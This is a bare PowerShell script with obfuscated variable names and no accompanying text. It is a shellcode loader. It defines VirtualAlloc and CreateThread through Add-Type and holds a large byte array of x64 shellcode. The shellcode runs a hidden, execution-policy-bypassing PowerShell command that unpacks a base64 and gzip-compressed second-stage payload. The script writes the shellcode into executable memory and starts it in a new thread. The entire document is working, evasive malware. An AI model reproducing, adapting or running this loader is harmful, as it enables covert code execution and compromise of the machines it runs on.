$kymErjNMzc = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$gCKdFjHgzcyxNd = Add-Type -memberDefinition $kymErjNMzc -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $SRBMUoYje = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5,0x70,0x6f,0x77,0x65,0x72,0x73,0x68,0x65,0x6c,0x6c,0x2e,0x65,0x78,0x65,0x20,0x2d,0x6e,0x6f,0x70,0x20,0x2d,0x77,0x20,0x68,0x69,0x64,0x64,0x65,0x6e,0x20,0x2d,0x6e,0x6f,0x6e,0x69,0x20,0x2d,0x65,0x70,0x20,0x62,0x79,0x70,0x61,0x73,0x73,0x20,0x22,0x26,0x28,0x5b,0x73,0x63,0x72,0x69,0x70,0x74,0x62,0x6c,0x6f,0x63,0x6b,0x5d,0x3a,0x3a,0x63,0x72,0x65,0x61,0x74,0x65,0x28,0x28,0x4e,0x65,0x77,0x2d,0x4f,0x62,0x6a,0x65,0x63,0x74,0x20,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x49,0x4f,0x2e,0x53,0x74,0x72,0x65,0x61,0x6d,0x52,0x65,0x61,0x64,0x65,0x72,0x28,0x4e,0x65,0x77,0x2d,0x4f,0x62,0x6a,0x65,0x63,0x74,0x20,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x49,0x4f,0x2e,0x43,0x6f,0x6d,0x70,0x72,0x65,0x73,0x73,0x69,0x6f,0x6e,0x2e,0x47,0x7a,0x69,0x70,0x53,0x74,0x72,0x65,0x61,0x6d,0x28,0x28,0x4e,0x65,0x77,0x2d,0x4f,0x62,0x6a,0x65,0x63,0x74,0x20,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x49,0x4f,0x2e,0x4d,0x65,0x6d,0x6f,0x72,0x79,0x53,0x74,0x72,0x65,0x61,0x6d,0x28,0x2c,0x5b,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x43,0x6f,0x6e,0x76,0x65,0x72,0x74,0x5d,0x3a,0x3a,0x46,0x72,0x6f,0x6d,0x42,0x61,0x73,0x65,0x36,0x34,0x53,0x74,0x72,0x69,0x6e,0x67,0x28,0x28,0x28,0x27,0x27,0x2b,0x27,0x48,0x34,0x73,0x49,0x41,0x4b,0x30,0x38,0x5a,0x57,0x4d,0x43,0x41,0x35,0x56,0x56,0x58,0x57,0x2f,0x62,0x4f,0x42,0x42,0x38,0x39,0x36,0x39,0x59,0x47,0x4c,0x71,0x4c,0x68,0x4d,0x69,0x45,0x6e,0x54,0x34,0x63,0x45,0x43,0x42,0x46,0x66,0x57,0x70,0x61,0x42,0x4d,0x69,0x31,0x52,0x70,0x56,0x72,0x48,0x67,0x77,0x44,0x6f,0x61,0x6c,0x31,0x72,0x41,0x74,0x4e,0x75,0x69,0x27,0x2b,0x27,0x51,0x56,0x32,0x30,0x6a,0x38,0x33,0x34,0x2b,0x55,0x71,0x41,0x2f,0x48,0x43,0x64,0x6f,0x4b,0x68,0x69,0x56,0x79,0x6c,0x38,0x50,0x68,0x37,0x7b,0x32,0x7d,0x42,0x63,0x46,0x49,0x4b,0x5a,0x58,0x41,0x72,0x34,0x6a,0x47,0x5a,0x77,0x69,0x33,0x50,0x47,0x63,0x78,0x51,0x47,0x65,0x6b,0x38,0x39,0x73,0x45,0x2b,0x77,0x59,0x58,0x41,0x42,0x58,0x33,0x41,0x7b,0x31,0x7d,0x2b,0x44,0x72,0x2f,0x44,0x35,0x6d,0x42,0x77,0x63,0x31,0x27,0x2b,0x27,0x75,0x6a,0x56,0x2f,0x6f,0x43,0x6d,0x32,0x6e,0x49,0x54,0x59,0x2f,0x4b,0x66,0x50,0x72,0x5a,0x50,0x4b,0x76,0x27,0x2b,0x27,0x78,0x6f,0x2b,0x34,0x6f,0x41,0x55,0x33,0x69,0x63,0x4c,0x4d,0x52,0x6e,0x4c,0x4b,0x74,0x59,0x55,0x49,0x6a,0x43,0x71,0x77,0x79,0x5a,0x6f,0x6f,0x75,0x64,0x32,0x52,0x46,0x78,0x6d,0x32,0x76,0x39,0x4e,0x54,0x35,0x2f,0x62,0x32,0x76,0x55,0x56,0x4e,0x63,0x53,0x30,0x33,0x71,0x47,0x7b,0x31,0x7d,0x4c,0x73,0x6f,0x4d,0x79,0x50,0x71,0x47,0x4b,0x72,0x73,0x4c,0x71,0x65,0x35,0x6f,0x61,0x6c,0x59,0x76,0x37,0x57,0x5a,0x44,0x49,0x31,0x59,0x71,0x4b,0x4c,0x44,0x37,0x73,0x54,0x54,0x56,0x6e,0x55,0x72,0x7b,0x31,0x7d,0x6f,0x2f,0x43,0x67,0x33,0x67,0x6b,0x75,0x61,0x6c,0x62,0x32,0x52,0x78,0x31,0x53,0x53,0x6f,0x64,0x62,0x67,0x42,0x56,0x6a,0x7b,0x32,0x7d,0x72,0x4f,0x44,0x6f,0x43,0x48,0x34,0x49,0x49,0x36,0x68,0x53,0x38,0x67,0x57,0x45,0x39,0x54,0x51,0x77,0x77,0x42,0x2f,0x51,0x6e,0x2b,0x63,0x69,0x36,0x30,0x64,0x6c,0x73,0x42,0x70,0x58,0x6a,0x75,0x57,0x35,0x4e,0x69,0x68,0x51,0x32,0x63,0x48,0x54,0x64,0x27,0x2b,0x27,0x47,0x65,0x2f,0x56,0x38,0x53,0x70,0x6c,0x6b,0x72,0x32,0x67,0x45,0x61,0x54,0x47,0x37,0x61,0x2b,0x39,0x68,0x6d,0x7b,0x31,0x7d,0x30,0x62,0x74,0x33,0x66,0x78,0x30,0x50,0x7b,0x32,0x7d,0x4e,0x70,0x51,0x5a,0x64,0x79,0x38,0x66,0x75,0x59,0x79,0x36,0x6b,0x74,0x30,0x30,0x63,0x6b,0x62,0x4d,0x34,0x5a,0x72,0x59,0x27,0x2b,0x27,0x77,0x47,0x72,0x63,0x6f,0x51,0x56,0x6c,0x66,0x31,0x62,0x64,0x42,0x55,0x2b,0x6f,0x74,0x7b,0x32,0x7d,0x34,0x7b,0x31,0x7d,0x4c,0x69,0x42,0x37,0x70,0x54,0x38,0x4e,0x65,0x62,0x7b,0x32,0x7d,0x78,0x45,0x2f,0x55,0x48,0x77,0x31,0x7b,0x32,0x7d,0x2f,0x52,0x76,0x31,0x59,0x37,0x63,0x4d,0x50,0x33,0x65,0x76,0x30,0x6b,0x38,0x62,0x68,0x27,0x2b,0x27,0x58,0x54,0x6c,0x79,0x46,0x62,0x59,0x78,0x50,0x6f,0x73,0x4c,0x66,0x73,0x73,0x79,0x5a,0x5a,0x65,0x56,0x5a,0x27,0x2b,0x27,0x36,0x4b,0x6e,0x62,0x4e,0x4b,0x33,0x31,0x65,0x6a,0x77,0x30,0x31,0x72,0x6e,0x74,0x5a,0x67,0x62,0x39,0x42,0x44,0x56,0x71,0x6a,0x63,0x37,0x45,0x68,0x61,0x70,0x34,0x5a,0x2b,0x2f,0x6a,0x68,0x59,0x57,0x45,0x39,0x68,0x48,0x44,0x34,0x46,0x4e,0x78,0x5a,0x39,0x44,0x77,0x4f,0x71,0x59,0x58,0x6f,0x77,0x35,0x68,0x75,0x75,0x70,0x4d,0x45,0x45,0x6c,0x63,0x6b,0x58,0x4f,0x61,0x4d,0x47,0x76,0x31,0x4f,0x65,0x27,0x2b,0x27,0x5a,0x39,0x51,0x5a,0x4c,0x36,0x47,0x63,0x7b,0x31,0x7d,0x79,0x6c,0x37,0x6d,0x45,0x58,0x52,0x4b,0x33,0x27,0x2b,0x27,0x54,0x49,0x75,0x44,0x42,0x4c,0x35,0x31,0x6f,0x33,0x61,0x4b,0x78,0x66,0x46,0x79,0x59,0x51,0x42,0x65,0x64,0x78,0x33,0x33,0x41,0x39,0x4f,0x75,0x74,0x37,0x4e,0x6c,0x32,0x77,0x52,0x71,0x56,0x32,0x6c,0x56,0x30,0x5a,0x70,0x2f,0x4f,0x64,0x77,0x65,0x6c,0x73,0x46,0x72,0x69,0x33,0x4d,0x2b,0x4f,0x51,0x6b,0x4c,0x4f,0x68,0x66,0x5a,0x37,0x2f,0x65,0x42,0x72,0x75,0x76,0x64,0x49,0x6f,0x73,0x6a,0x6f,0x63,0x54,0x67,0x31,0x75,0x44,0x55,0x48,0x42,0x5a,0x4f,0x61,0x63,0x66,0x6e,0x34,0x2b,0x54,0x70,0x4f,0x72,0x71,0x38,0x69,0x70,0x2f,0x37,0x66,0x4c,0x43,0x66,0x75,0x33,0x31,0x72,0x7b,0x32,0x7d,0x79,0x6f,0x32,0x48,0x69,0x4e,0x6c,0x57,0x36,0x52,0x4d,0x35,0x42,0x46,0x55,0x4c,0x59,0x62,0x4c,0x44,0x61,0x46,0x4e,0x72,0x61,0x74,0x67,0x2b,0x6e,0x45,0x4b,0x42,0x34,0x27,0x2b,0x27,0x50,0x48,0x63,0x74,0x34,0x54,0x62,0x39,0x71,0x65,0x32,0x7b,0x31,0x7d,0x5a,0x57,0x6f,0x43,0x54,0x4b,0x37,0x57,0x68,0x57,0x6d,0x44,0x64,0x79,0x4b,0x52,0x36,0x35,0x33,0x4b,0x37,0x35,0x63,0x47,0x77,0x69,0x53,0x43,0x66,0x33,0x4b,0x6d,0x70,0x7b,0x32,0x7d,0x59,0x4c,0x41,0x34,0x6c,0x55,0x61,0x36,0x6c,0x4b,0x4f,0x51,0x6d,0x4d,0x33,0x57,0x51,0x75,0x53,0x59,0x4e,0x43,0x69,0x2f,0x32,0x49,0x47,0x62,0x6b,0x54,0x64,0x38,0x49,0x62,0x30,0x73,0x74,0x42,0x62,0x6d,0x31,0x68,0x4d,0x47,0x77,0x58,0x46,0x67,0x2f,0x6a,0x74,0x6b,0x47,0x75,0x55,0x64,0x79,0x62,0x5a,0x64,0x64,0x45,0x39,0x58,0x62,0x75,0x32,0x75,0x6a,0x49,0x52,0x62,0x2b,0x6e,0x30,0x76,0x52,0x27,0x2b,0x27,0x30,0x42,0x74,0x63,0x57,0x30,0x73,0x6e,0x69,0x6a,0x77,0x4c,0x53,0x38,0x50,0x78,0x39,0x72,0x76,0x57,0x6f,0x54,0x31,0x7b,0x32,0x7d,0x64,0x55,0x72,0x61,0x30,0x6e,0x43,0x74,0x51,0x79,0x45,0x56,0x7b,0x31,0x7d,0x31,0x4c,0x52,0x5a,0x4c,0x57,0x33,0x33,0x68,0x41,0x63,0x6e,0x64,0x45,0x54,0x71,0x31,0x56,0x61,0x48,0x57,0x59,0x30,0x55,0x50,0x56,0x2b,0x7b,0x32,0x7d,0x52,0x2f,0x6d,0x41,0x67,0x38,0x76,0x74,0x27,0x2b,0x27,0x32,0x6d,0x71,0x72,0x72,0x64,0x34,0x4e,0x79,0x72,0x35,0x72,0x71,0x63,0x30,0x79,0x35,0x78,0x69,0x47,0x51,0x56,0x36,0x36,0x72,0x6c,0x72,0x45,0x4e,0x36,0x52,0x5a,0x57,0x48,0x6b,0x73,0x68,0x6d,0x45,0x4d,0x77,0x51,0x48,0x37,0x43,0x41,0x59,0x43,0x59,0x58,0x67,0x6b,0x36,0x61,0x58,0x54,0x44,0x37,0x4d,0x62,0x71,0x2b,0x56,0x62,0x6c,0x34,0x58,0x66,0x70,0x43,0x36,0x46,0x6c,0x42,0x70,0x66,0x65,0x73,0x31,0x62,0x46,0x4c,0x76,0x56,0x71,0x4b,0x50,0x53,0x51,0x66,0x4e,0x6e,0x52,0x62,0x6d,0x36,0x57,0x6c,0x51,0x49,0x38,0x75,0x68,0x46,0x4e,0x65,0x33,0x4f,0x64,0x4d,0x55,0x38,0x57,0x6a,0x63,0x4d,0x36,0x6b,0x4f,0x76,0x41,0x6a,0x39,0x37,0x2f,0x2b,0x63,0x49,0x6e,0x75,0x46,0x72,0x59,0x51,0x59,0x56,0x4b,0x6e,0x6a,0x7b,0x31,0x7d,0x48,0x45,0x43,0x64,0x51,0x53,0x6c,0x49,0x44,0x58,0x77,0x4b,0x7b,0x32,0x7d,0x35,0x4d,0x55,0x54,0x75,0x79,0x37,0x31,0x50,0x39,0x61,0x73,0x74,0x4c,0x44,0x45,0x5a,0x6c,0x51,0x73,0x33,0x54,0x52,0x39,0x33,0x44,0x53,0x67,0x6d,0x77,0x64,0x6b,0x51,0x43,0x56,0x6b,0x6d,0x6f,0x36,0x6e,0x42,0x31,0x4d,0x31,0x6d,0x46,0x64,0x78,0x67,0x6e,0x6a,0x53,0x46,0x55,0x59,0x76,0x63,0x62,0x67,0x6f,0x74,0x75,0x77,0x57,0x32,0x33,0x62,0x4f,0x7b,0x31,0x7d,0x62,0x77,0x4c,0x2f,0x6d,0x33,0x68,0x66,0x6d,0x70,0x59,0x37,0x75,0x47,0x50,0x66,0x7b,0x32,0x7d,0x72,0x50,0x65,0x59,0x54,0x4c,0x2f,0x53,0x79,0x75,0x51,0x66,0x39,0x77,0x65,0x4d,0x50,0x39,0x6f,0x52,0x4c,0x6a,0x58,0x34,0x39,0x35,0x58,0x61,0x73,0x62,0x36,0x65,0x75,0x59,0x64,0x6f,0x72,0x4b,0x7b,0x31,0x7d,0x56,0x79,0x58,0x64,0x39,0x54,0x2f,0x74,0x38,0x36,0x73,0x37,0x6e,0x69,0x6d,0x39,0x72,0x35,0x75,0x2b,0x70,0x2f,0x74,0x78,0x65,0x48,0x76,0x71,0x67,0x49,0x41,0x41,0x41,0x7b,0x30,0x7d,0x27,0x29,0x2d,0x66,0x27,0x3d,0x27,0x2c,0x27,0x7a,0x27,0x2c,0x27,0x4a,0x27,0x29,0x29,0x29,0x29,0x2c,0x5b,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x49,0x4f,0x2e,0x43,0x6f,0x6d,0x70,0x72,0x65,0x73,0x73,0x69,0x6f,0x6e,0x2e,0x43,0x6f,0x6d,0x70,0x72,0x65,0x73,0x73,0x69,0x6f,0x6e,0x4d,0x6f,0x64,0x65,0x5d,0x3a,0x3a,0x44,0x65,0x63,0x6f,0x6d,0x70,0x72,0x65,0x73,0x73,0x29,0x29,0x29,0x2e,0x52,0x65,0x61,0x64,0x54,0x6f,0x45,0x6e,0x64,0x28,0x29,0x29,0x29,0x22,0x0


$vDKfTowQd = $gCKdFjHgzcyxNd::VirtualAlloc(0,[Math]::Max($SRBMUoYje.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($SRBMUoYje,0,$vDKfTowQd,$SRBMUoYje.Length)

$gCKdFjHgzcyxNd::CreateThread(0,0,$vDKfTowQd,0,0,0)
